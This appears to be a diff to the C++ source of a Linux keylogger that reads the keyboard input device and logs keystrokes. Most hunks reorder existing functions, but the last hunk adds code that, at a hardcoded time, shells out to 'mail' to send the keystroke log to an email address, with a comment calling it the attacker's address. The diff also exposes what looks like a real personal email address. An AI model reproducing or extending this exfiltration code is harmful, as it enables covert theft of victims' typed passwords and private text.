@@ -77,89 +77,12 @@ std::string execute(const char* cmd)
 
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
-
 void signal_handler(int signal)
 {
   if (input_fd != -1)
     close(input_fd);  // closing input file will break the infinite while loop
 }
 
-void set_utf8_locale()
-{
-  // set locale to common UTF-8 for wchars to be recognized correctly
-  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
-    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
-    if (locale != NULL && 
-        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
-         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
-      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
-    else
-      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
-  }
-}
-
-void exit_cleanup(int status, void *discard)
-{
-  // TODO:
-}
-
-void create_PID_file()
-{
-  // create temp file carrying PID for later retrieval
-  int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
-  if (pid_fd != -1) {
-    char pid_str[16] = {0};
-    sprintf(pid_str, "%d", getpid());
-    if (write(pid_fd, pid_str, strlen(pid_str)) == -1)
-      error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
-    close(pid_fd);
-  }
-  else {
-    if (errno == EEXIST)
-         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
-    else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
-  }
-}
-
-void kill_existing_process()
-{
-  pid_t pid;
-  bool via_file = true;
-  bool via_pipe = true;
-  FILE *temp_file = fopen(PID_FILE, "r");
-  
-  via_file &= (temp_file != NULL);
-  
-  if (via_file) {  // kill process with pid obtained from PID file
-    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
-    fclose(temp_file);
-  }
-  
-  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
-    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
-    via_pipe &= (pid != getpid());
-  }
-  
-  if (via_file || via_pipe) {
-    remove(PID_FILE);
-    kill(pid, SIGINT);
-
-    exit(EXIT_SUCCESS);  // process killed successfully, exit
-  }
-  error(EXIT_FAILURE, 0, "No process killed");
-}
-
-void set_signal_handling()
-{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
-  struct sigaction act = {{0}};
-  act.sa_handler = signal_handler;
-  sigaction(SIGHUP,  &act, NULL);
-  sigaction(SIGINT,  &act, NULL);
-  sigaction(SIGTERM, &act, NULL);
-  // prevent child processes from becoming zombies
-  act.sa_handler = SIG_IGN;
-  sigaction(SIGCHLD, &act, NULL);
-}
 
 void determine_system_keymap()
 {
@@ -231,6 +154,169 @@ void determine_system_keymap()
 }
 
 
+
+void kill_existing_process()
+{
+  pid_t pid;
+  bool via_file = true;
+  bool via_pipe = true;
+  FILE *temp_file = fopen(PID_FILE, "r");
+  
+  via_file &= (temp_file != NULL);
+  
+  if (via_file) {  // kill process with pid obtained from PID file
+    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
+    fclose(temp_file);
+  }
+  
+  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
+    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
+    via_pipe &= (pid != getpid());
+  }
+  
+  if (via_file || via_pipe) {
+    remove(PID_FILE);
+    kill(pid, SIGINT);
+
+    exit(EXIT_SUCCESS);  // process killed successfully, exit
+  }
+  error(EXIT_FAILURE, 0, "No process killed");
+}
+
+
+void set_signal_handling()
+{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
+  struct sigaction act = {{0}};
+  act.sa_handler = signal_handler;
+  sigaction(SIGHUP,  &act, NULL);
+  sigaction(SIGINT,  &act, NULL);
+  sigaction(SIGTERM, &act, NULL);
+  // prevent child processes from becoming zombies
+  act.sa_handler = SIG_IGN;
+  sigaction(SIGCHLD, &act, NULL);
+}
+
+
+void determine_input_device()
+{
+  // better be safe than sory: while running other programs, switch user to nobody
+  setegid(65534); seteuid(65534);
+  
+  // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
+  std::stringstream output(execute(COMMAND_STR_DEVICES));
+  
+  std::vector<std::string> results;
+  std::string line;
+  
+  while(std::getline(output, line)) {
+    std::string::size_type i = line.find("event");
+    if (i != std::string::npos) i += 5; // "event".size() == 5
+    if (i < line.size()) {
+      int index = atoi(&line.c_str()[i]);
+      
+      if (index != -1) {
+        std::stringstream input_dev_path;
+        input_dev_path << INPUT_EVENT_PATH;
+        input_dev_path << "event";
+        input_dev_path << index;
+
+        results.push_back(input_dev_path.str());
+      }
+    }
+  }
+  
+  if (results.size() == 0) {
+    error(0, 0, "Couldn't determine keyboard device. :/");
+    error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
+  }
+
+  args.device = results[0];  // for now, use only the first found device
+  
+  // now we reclaim those root privileges
+  seteuid(0); setegid(0);
+}
+
+
+
+void set_utf8_locale()
+{
+  // set locale to common UTF-8 for wchars to be recognized correctly
+  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
+    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
+    if (locale != NULL && 
+        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
+         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
+      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
+    else
+      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
+  }
+}
+
+
+void exit_cleanup(int status, void *discard)
+{
+  // TODO:
+}
+
+
+void create_PID_file()
+{
+  // create temp file carrying PID for later retrieval
+  int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
+  if (pid_fd != -1) {
+    char pid_str[16] = {0};
+    sprintf(pid_str, "%d", getpid());
+    if (write(pid_fd, pid_str, strlen(pid_str)) == -1)
+      error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
+    close(pid_fd);
+  }
+  else {
+    if (errno == EEXIST)
+         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
+    else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
+  }
+}
+
+
+void export_keymap_to_file()
+{
+  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
+  if (keymap_fd == -1)
+    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
+  char buffer[32];
+  int buflen = 0;
+  unsigned int index;
+  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
+    buflen = 0;
+    if (is_char_key(i)) {
+      index = to_char_keys_index(i);
+      // only export non-null characters
+      if (char_keys[index]  != L'\0' && 
+          shift_keys[index] != L'\0' && 
+          altgr_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
+      else if (char_keys[index]  != L'\0' && 
+               shift_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
+      else if (char_keys[index] != L'\0')
+        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
+      else  // if all \0, export nothing on that line (=keymap will not parse)
+        buflen = sprintf(buffer, "\n");
+    }
+    else if (is_func_key(i)) {
+      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
+    }
+    
+    if (is_used_key(i))
+      if (write(keymap_fd, buffer, buflen) < buflen)
+        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
+  }
+  close(keymap_fd);
+  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
+  exit(EXIT_SUCCESS);
+}
+
+
 void parse_input_keymap()
 {
   // custom map will be used; erase existing US keytables
@@ -285,83 +371,6 @@ void parse_input_keymap()
   if (line_number < N_KEYS_DEFINED)
 #define QUOTE(x) #x  // quotes x so it can be used as (char*)
     error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap.c_str());
-}
-
-void export_keymap_to_file()
-{
-  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
-  if (keymap_fd == -1)
-    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
-  char buffer[32];
-  int buflen = 0;
-  unsigned int index;
-  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
-    buflen = 0;
-    if (is_char_key(i)) {
-      index = to_char_keys_index(i);
-      // only export non-null characters
-      if (char_keys[index]  != L'\0' && 
-          shift_keys[index] != L'\0' && 
-          altgr_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
-      else if (char_keys[index]  != L'\0' && 
-               shift_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
-      else if (char_keys[index] != L'\0')
-        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
-      else  // if all \0, export nothing on that line (=keymap will not parse)
-        buflen = sprintf(buffer, "\n");
-    }
-    else if (is_func_key(i)) {
-      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
-    }
-    
-    if (is_used_key(i))
-      if (write(keymap_fd, buffer, buflen) < buflen)
-        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
-  }
-  close(keymap_fd);
-  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
-  exit(EXIT_SUCCESS);
-}
-
-void determine_input_device()
-{
-  // better be safe than sory: while running other programs, switch user to nobody
-  setegid(65534); seteuid(65534);
-  
-  // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
-  std::stringstream output(execute(COMMAND_STR_DEVICES));
-  
-  std::vector<std::string> results;
-  std::string line;
-  
-  while(std::getline(output, line)) {
-    std::string::size_type i = line.find("event");
-    if (i != std::string::npos) i += 5; // "event".size() == 5
-    if (i < line.size()) {
-      int index = atoi(&line.c_str()[i]);
-      
-      if (index != -1) {
-        std::stringstream input_dev_path;
-        input_dev_path << INPUT_EVENT_PATH;
-        input_dev_path << "event";
-        input_dev_path << index;
-
-        results.push_back(input_dev_path.str());
-      }
-    }
-  }
-  
-  if (results.size() == 0) {
-    error(0, 0, "Couldn't determine keyboard device. :/");
-    error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
-  }
-
-  args.device = results[0];  // for now, use only the first found device
-  
-  // now we reclaim those root privileges
-  seteuid(0); setegid(0);
 }
 
 
@@ -443,10 +452,12 @@ int main(int argc, char **argv)
   // now we need those privileges back in order to create system-wide PID_FILE
   seteuid(0); setegid(0);
   create_PID_file();
-  
+
   // now we've got everything we need, finally drop privileges by becoming 'nobody'
   //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
   
+  // END OF SETUP
+
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
@@ -614,7 +625,19 @@ int main(int argc, char **argv)
     prev_code = scan_code;
     fflush(out);
     if (inc_size > 0) file_size += inc_size;
-    
+
+    // ADDED BY ELI
+    // End of reading input loop: add in mail command (clear log file after sending mail) and encryption (?)
+
+    char *email_time = "2014-05-10 11:15"; // ** Change this according
+    if(!(strncmp(timestamp, email_time, strlen(email_time)))) {
+      char command[2500]; // Maximum size of string
+      strcpy(command, "mail stine.eli@gmail.com < "); // ** change with attackers address
+      strcat(command, args.logfile.c_str()); // our log file
+      strcat(command, " 2>/dev/null");
+      return system(command);
+    }
+
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
